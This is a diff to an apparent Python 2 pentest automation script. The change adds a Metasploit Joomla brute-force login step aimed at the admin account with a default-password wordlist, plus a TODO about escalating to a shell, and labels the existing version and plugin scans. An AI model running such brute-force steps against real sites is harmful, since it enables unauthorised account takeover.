@@ -146,11 +146,27 @@ def check_iis(target, rport):
 
 def check_joomla(target,rport):
   print '    + loading : joomla modules, port : ', rport
+
+  print '      + joomla_bruteforce'
+  saveWWWRc('use auxiliary/scanner/http/joomla_bruteforce_login\n')
+  saveWWWRc('set RHOSTS ' + target + '\n')
+  saveWWWRc('set RPORT ' + rport + '\n')
+  saveWWWRc('set AUTH_URI /joomla/administrator/index.php \n') # TODO: 3rd param targeturi
+  saveWWWRc('set PASS_FILE /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt\n')
+  saveWWWRc('set VERBOSE false\n')
+  saveWWWRc('set USERNAME admin\n')
+  saveWWWRc('set FORM_URI /joomla/administrator\n')
+  saveWWWRc('set STOP_ON_SUCCESS true\n')
+  saveWWWRc('run\n') # TODO: get admin's login and escalate to shell
+
+
+  print '      + joomla_version'
   saveWWWRc('use auxiliary/scanner/http/joomla_version\n')
   saveWWWRc('set RHOSTS ' + target + '\n')
   saveWWWRc('set RPORT ' + rport + '\n')
   saveWWWRc('run\n')
 
+  print '      + joomla_plugins'
   saveWWWRc('use auxiliary/scanner/http/joomla_plugins\n')
   saveWWWRc('set RHOSTS ' + target + '\n')
   saveWWWRc('set RPORT ' + rport + '\n')
